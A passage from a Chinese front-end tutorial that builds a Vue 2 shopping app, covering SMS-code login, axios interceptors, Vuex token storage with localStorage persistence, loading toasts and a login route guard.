#D4D4D4">(</span><span style="color: #CE9178">'请输入正确的短信验证码！'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">codeLogin</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phoneNum</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">smsCode</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">status</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'登录成功'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/home'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'登录失败，请检查手机号和验证码是否正确'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>后面失败的多种情况可以通过响应拦截器进行处理，在这里暂时只考虑成功的情况</p><h2 id="响应处理器统一处理错误提示"><a class="markdownIt-Anchor" href="#响应处理器统一处理错误提示"></a> 响应处理器统一处理错误提示</h2><p>对 utils 包下的 request 拦截器进行修改</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 响应拦截器</span></span><span class="line"><span style="color: #9CDCFE">instance</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">interceptors</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 2xx 范围内的状态码都会触发该函数。</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 对响应数据做点什么 (默认axios会对响应多包装一层data，所以这里需要取出data)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">status</span><span style="color: #D4D4D4"> !== </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">message</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Promise</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reject</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">message</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 超出 2xx 范围的状态码都会触发该函数。</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 对响应错误做点什么</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 服务器返回了错误响应</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">`服务器错误: </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">status</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 请求已发出，但没有收到响应</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"请求超时或网络错误"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 其他错误</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"请求配置错误"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Promise</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reject</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><h2 id="登录权证信息存储"><a class="markdownIt-Anchor" href="#登录权证信息存储"></a> 登录权证信息存储</h2><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291344002.png" alt="image-20240829134402875"></p><p>使用 vuex 构建 user 模块存储登录权证（token 和 userID）。好处是易获取、响应式，分模块便于管理维护。</p><p>在 store 包下新建 modules 包，然后在 modules 包下新建 user.js</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">namespaced:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">state</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 个人权证</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">userInfo:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">token:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">userId:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      },</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mutations:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setUserInfo</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">userInfo</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">actions:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getters:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>然后在 vuex 中进行挂载</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">User</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/store/modules/user"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C8C8C8">modules</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">User</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>并在登录页面将要实现跳转到首页的前一刻完成用户权证信息的存储</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"User/setUserInfo"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291411700.png" alt="image-20240829141130620"></p><h2 id="vuex-持久化处理"><a class="markdownIt-Anchor" href="#vuex-持久化处理"></a> vuex 持久化处理</h2><p>vuex 刷新就会丢失信息，于是引入持久化存储。我们将获取、设置和移除信息的操作封装为 storage 模块。</p><p>在 utils 包下新建一个 storage.js</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 约定一个通用键名</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">INFO_KEY</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"go_shopping_info"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getInfo</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">defaultInfo</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">token:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">userId:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">info</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getItem</span><span style="color: #D4D4D4">(</span><span style="color: #4FC1FF">INFO_KEY</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 判断info是否有值</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">info</span><span style="color: #D4D4D4"> ? </span><span style="color: #4FC1FF">JSON</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">parse</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">info</span><span style="color: #D4D4D4">) : </span><span style="color: #9CDCFE">defaultInfo</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setInfo</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setItem</span><span style="color: #D4D4D4">(</span><span style="color: #4FC1FF">INFO_KEY</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">JSON</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stringify</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">removeInfo</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">removeItem</span><span style="color: #D4D4D4">(</span><span style="color: #4FC1FF">INFO_KEY</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>然后到 vuex 的 user 子模块中进行导入使用即可</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getInfo</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">setInfo</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/storage"</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291432317.png" alt="image-20240829143212223"></p><h2 id="添加请求-loading-效果"><a class="markdownIt-Anchor" href="#添加请求-loading-效果"></a> 添加请求 Loading 效果</h2><p>需求分析：有时候因为网络原因，一次请求的结果可能需要一段时间后才能回来。此时，需要给用户添加 loading 提示。</p><p>添加 loading 提示的好处：</p><ol><li><strong>节流处理</strong>：防止用户在一次请求还没回来之前，多次进行点击，发送无效请求</li><li><strong>友好提示</strong>：告知用户，目前是在加载中，请耐心等待，用户体验会更好</li></ol><p>加在哪呢？可以统一加在拦截器中，这样一来后面也可以复用：</p><ol><li><strong>请求拦截器</strong>中，每次请求，打开 loading</li><li><strong> 响应拦截器</strong>中，每次响应，关闭 loading</li></ol><p>转到 utils 包下的 request 拦截器，在请求的时候显示 Toast 提示，并设置背景不可点击且使其不会定时消失，只能由我们清除。</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">instance</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">interceptors</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 在发送请求之前做些什么</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 发送请求时显示Toast提示，背景不可点击</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">loading</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">message:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'加载中...'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">forbidClick:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 禁止背景点击</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">duration:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 值为0时，toast不会自动关闭</span></span><span class="line"><span style="color: #D4D4D4">  })</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">config</span></span><span class="line"><span style="color: #D4D4D4">}, </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {...})</span></span></code></pre></div></div></figure><p>在响应拦截器添加清除提示的代码</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 对响应数据做点什么 (默认axios会对响应多包装一层data，所以这里需要取出data)</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">status</span><span style="color: #D4D4D4"> !== </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">message</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Promise</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reject</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">message</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 关闭Toast提示</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">clear</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><h2 id="全局路由前置守卫"><a class="markdownIt-Anchor" href="#全局路由前置守卫"></a> 全局路由前置守卫</h2><p><a href="https://router.vuejs.org/zh/guide/">Vue-router 官网地址</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291814256.png" alt="image-20240829181413117"><br>在 router 中编写：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'@/store'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 定义数组存储需要登录才能访问的路由</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">authNeedRouters</span><span style="color: #D4D4D4"> = [</span><span style="color: #CE9178">'/myorder'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'/pay'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'/productdetail/:id'</span><span style="color: #D4D4D4">]</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 创建全局路由前置守卫</span></span><span class="line"><span style="color: #9CDCFE">router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">beforeEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">to</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">from</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">next</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 判断to的path是否存在登录的路由数组中</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #9CDCFE">authNeedRouters</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">includes</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">to</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 不需要登录，直接进入</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">next</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">  } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 判断是否有token（实际上需要调用后端接口校验token）</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">token</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">User</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">userInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">token</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">token</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 有token，可以进入</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">next</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 没有token，跳转到登录页</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">next</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/login'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">})</span></span></code></pre></div></div></figure><h2 id="首页"><a class="markdownIt-Anchor" href="#首页"></a> 首页</h2><h3 id="完成首页静态结构"><a class="markdownIt-Anchor" href="#完成首页静态结构"></a> 完成首页静态结构</h3><p>要用到的 vant 组件有</p><ul><li>search（搜索框）</li><li>swipe &amp; swipe-item （轮播图）</li><li>grid &amp; grid-item （宫格）</li></ul><p>grid 宫格主要是使用自定义列数的：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291915006.png" alt="image-20240829191508887" style="zoom:50%;"></p><p>所以在 utils 包下的 vant2-ui.js 中进行添加：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 